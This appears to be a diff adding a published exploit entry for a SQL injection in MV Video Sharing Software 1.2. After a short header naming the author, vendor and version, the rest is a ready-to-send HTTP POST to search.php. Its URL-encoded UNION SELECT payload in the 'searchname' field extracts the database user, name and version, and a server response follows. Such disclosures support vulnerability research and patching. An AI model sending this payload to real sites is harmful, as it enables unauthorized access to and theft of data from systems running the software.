@@ -1,0 +1,34 @@
+# Exploit Title: MV Video Sharing Software 1.2 - 'searchname' SQL Injection
+# Dork: N/A
+# Date: 2018-10-16
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://melerovideo.com/software/
+# Software Link: https://sourceforge.net/projects/mvvideosharingsoftware/
+# Version: 1.2
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/search.php
+# POST /searchname=[SQL]
+
+POST /[PATH]/search.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 404
+searchname=%27%20%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2c%43%4f%4e%43%41%54%28%43%4f%4e%43%41%54%5f%57%53%28%30%78%32%30%33%61%32%30%2c%55%53%45%52%28%29%2c%44%41%54%41%42%41%53%45%28%29%2c%56%45%52%53%49%4f%4e%28%29%29%29%2c%4e%55%4c%4c%2c%4e%55%4c%4c%2d%2d%20%45%66%65
+HTTP/1.1 200 OK
+Date: Tue, 16 Oct 2018 08:45:43 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
